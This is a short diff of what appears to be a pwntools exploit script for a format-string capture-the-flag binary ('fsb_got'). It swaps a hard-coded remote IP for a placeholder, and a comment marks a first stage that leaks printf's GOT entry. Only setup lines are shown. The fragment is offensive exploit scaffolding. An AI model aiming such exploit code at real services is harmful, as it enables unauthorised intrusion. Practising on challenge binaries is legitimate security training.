@@ -5,7 +5,7 @@ import time
 context.binary = elf = ELF("./fsb_got", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 
-p = remote("47.83.170.192", 32814)
+p = remote("<host-ip>", port)
 
 # ---------- stage 1: leak printf@GOT ----------
 p.recvuntil(b"say something: ")
